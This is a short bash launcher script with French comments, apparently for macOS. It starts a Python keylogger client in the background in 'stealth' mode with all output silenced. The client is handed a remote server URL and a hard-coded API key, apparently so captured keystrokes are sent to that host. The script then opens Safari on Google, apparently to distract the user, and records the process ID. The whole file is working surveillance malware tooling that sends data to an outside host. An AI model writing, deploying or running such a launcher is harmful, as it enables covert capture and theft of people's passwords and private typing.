#!/bin/bash

# Configuration
SERVER_URL="https://api.keylog.claverie.site"
API_KEY="72Us_Pl9QtgelVRbJ44u-G6hcNiS_IWx64MEOWcmcCQ"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
KEYLOGGER_SCRIPT="$SCRIPT_DIR/keylogger_client_v2.py"
PID_FILE="$SCRIPT_DIR/.keylogger.pid"

# Vérifier que le script existe
if [ ! -f "$KEYLOGGER_SCRIPT" ]; then
    echo "❌ Erreur: $KEYLOGGER_SCRIPT introuvable"
    exit 1
fi

# Vérifier si déjà en cours
if [ -f "$PID_FILE" ]; then
    OLD_PID=$(cat "$PID_FILE")
    if ps -p $OLD_PID > /dev/null 2>&1; then
        echo "⚠️  Keylogger déjà en cours (PID: $OLD_PID)"
        echo "Pour l'arrêter: kill $OLD_PID"
        exit 1
    else
        rm "$PID_FILE"
    fi
fi

# Lancer le keylogger en arrière-plan avec stealth
nohup python3 "$KEYLOGGER_SCRIPT" "$SERVER_URL" "$API_KEY" --stealth > /dev/null 2>&1 &
PID=$!
open -a "Safari" "https://www.google.com"
# Sauvegarder le PID
echo $PID > "$PID_FILE"

echo "✅ Keylogger v2.0 lancé en arrière-plan (PID: $PID)"
echo ""
echo "Pour arrêter: kill \$(cat $PID_FILE)"
echo "Ou: $SCRIPT_DIR/stop.command"
